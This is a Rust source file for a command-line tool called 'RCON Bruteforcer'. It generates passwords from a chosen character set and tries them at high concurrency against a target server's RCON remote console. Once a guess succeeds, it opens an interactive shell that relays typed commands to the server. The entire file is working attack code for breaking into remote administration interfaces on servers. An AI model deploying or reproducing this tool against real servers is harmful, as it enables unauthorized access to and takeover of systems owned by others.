extern crate clap;

use clap::{Arg, App};
use std::io::stdin;
use futures::stream::{self, StreamExt};
use charset::Charset;
use rcon::Connection;
use std::process::exit;
use console::style;
use bruteforce::*;
use std::net::SocketAddr;
use std::net::ToSocketAddrs;
use tokio::net::TcpStream;

#[tokio::main]
async fn main() {
    let matches = App::new("RCON Bruteforcer")
        .version("0.1.1")
        .author("CCBlueX")
        .about("Allows you to bruteforce RCON server.")
        .arg(Arg::with_name("host")
            .short("h")
            .long("host")
            .value_name("HOST")
            .help("Set the target host (127.0.0.1:25575)")
            .index(1)
            .required(true))
        .arg(Arg::with_name("charset")
            .short("s")
            .long("charset")
            .value_name("CHARSET")
            .help("Specify the password charset")
            .default_value("ABCDEFGHIJKLMNOPQRSTUVWXAZabcdefghijklmnopqrstuvwxyz123456789"))
        .arg(Arg::with_name("concurrents")
            .short("c")
            .long("concurrents")
            .value_name("CONCURRENTS")
            .help("How many concurrent connections")
            .default_value("10"))
        .get_matches();
    
    // Welcome message
    println!("{} {} by {}", style("RCON").red().bold(), style("Bruteforcer").red(),
             style("CCBlueX").blue().bold());
    
    let server = matches.value_of("host").unwrap();
    let concurrents = matches.value_of("concurrents").unwrap().parse::<usize>().unwrap();
    let string_charset = matches.value_of("charset").unwrap();

    let address = match server.to_socket_addrs() {
        Ok(mut addrs) => {
            addrs.next().unwrap()
        },
        Err(_) => {
            println!("{}", style(format!("{} is not a valid server address! Syntax: 127.0.0.1:25575", server)).red());
            return;
        }
    };


    // Just to verify user input
    println!("{}: {} ({})", style("Server").magenta(), server, address);
    println!(); // Empty line break

    // Check if online
    match TcpStream::connect(address).await {
        Ok(_) => {
            println!("{}", style(format!("{} seems to be online.", address)).green());
            // Stream is automatically being closed. Don't worry.
        }
        Err(_) => {
            println!("{}", style(format!("{} seems to be offline.", address)).red());
            return;
        }
    }

    // Bruteforce
    let charset = Charset::from(string_charset);
    let bruteforce = BruteForce::new(charset);

    let mut working_session = stream::iter(
        bruteforce.into_iter().map(|password| check_password(address, password))
    ).buffer_unordered(concurrents);

    while let Some(response) = working_session.next().await {
        if let Some(connection) = response {    
            handle_session(connection).await;
            break;
        }
    }
}

async fn check_password(addr: SocketAddr, password: String) -> Option<Connection> {
    let connection_builder = Connection::builder()
        .enable_minecraft_quirks(false);

    // Connect to server and try password
    match connection_builder.connect(addr, &*password).await {
        Ok(conn) => {
            // Connection established with correct password
            println!("{}\n", style(format!("Connection established to {} using '{}' as password!",
                                         addr, password)).green().bold());

            return Some(conn);
        },
        // Connection failed or password wrong (Auth!)
        Err(e) => {
            println!("{}", style(format!("Connection failed to {} using '{}' because of {:?} error!",
                                               addr, password, e)).red()); // Used {:?} for their names. As example "Auth" instead of "authentication failed"
            return None;
        }
    }
}

async fn handle_session(mut connection: Connection) {
    let line = &mut String::new();

    loop {
        // Read line from stdin to buffer
        match stdin().read_line(line) {
            Ok(_) => {
                // Exec command
                match connection.cmd(line).await {
                    Ok(response) => println!("{}", response), // Successfully executed command
                    Err(e) => println!("{}", e) // Something went wrong while sending command to server
                }
            }
            Err(_) => exit(1)
        }
    }
}